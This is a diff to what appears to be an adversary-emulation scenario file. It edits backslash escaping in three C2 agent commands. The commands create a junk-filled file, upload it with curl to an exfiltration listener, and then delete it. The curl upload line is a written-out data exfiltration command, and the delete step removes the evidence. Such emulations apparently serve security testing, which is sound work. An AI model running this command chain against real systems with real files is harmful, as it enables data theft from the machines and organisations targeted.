@@ -424,7 +424,7 @@ action "execute_agent_shell_command" "create_exfil_file" {
     delay             = "15"
     task_name         = resource.task.c2_task.task_name
     agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
-    command           = "New-Item ${variable.exfil_path}\\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){'1234567890qwertyasdfjkl;'*1048576 >> ${variable.exfil_path}\\${variable.exfil_file}}"
+    command           = "New-Item ${variable.exfil_path}\${variable.exfil_file}; while((Get-Item -Path ${variable.exfil_path}\${variable.exfil_file}).Length/1MB -le ${variable.exfil_size}){'1234567890qwertyasdfjkl;'*1048576 >> ${variable.exfil_path}\${variable.exfil_file}}"
     wait_for_results  = "true"
     depends_on        = action.execute_agent_module.invoke_wmi
 }
@@ -433,7 +433,7 @@ action "execute_agent_shell_command" "upload_exfil_file" {
     delay             = "15"
     task_name         = resource.task.c2_task.task_name
     agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
-    command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} https://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:443/p"
+    command           = "c:\Windows\System32\curl.exe -k -F file=@${variable.exfil_path}\${variable.exfil_file} https://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:443/p"
     wait_for_results  = "true"
     depends_on        = action.execute_agent_shell_command.create_exfil_file
 }
@@ -442,7 +442,7 @@ action "execute_agent_shell_command" "delete_exfil_file" {
     delay             = "15"
     task_name         = resource.task.c2_task.task_name
     agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
-    command           = "del ${variable.exfil_path}\\${variable.exfil_file}"
+    command           = "del ${variable.exfil_path}\${variable.exfil_file}"
     wait_for_results  = "true"
     depends_on        = action.execute_agent_shell_command.upload_exfil_file
 }
